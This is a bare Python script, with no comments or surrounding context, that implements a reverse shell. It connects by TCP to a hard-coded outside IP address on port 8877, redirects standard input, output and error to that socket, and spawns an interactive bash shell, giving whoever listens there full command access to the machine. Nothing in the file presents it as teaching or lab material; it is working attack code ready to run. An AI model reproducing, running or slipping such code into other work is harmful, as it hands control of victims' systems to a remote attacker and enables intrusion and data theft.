import socket
import os
import pty

def shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("107.173.87.48", 8877))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("bash")

if __name__ == '__main__':
    shell()
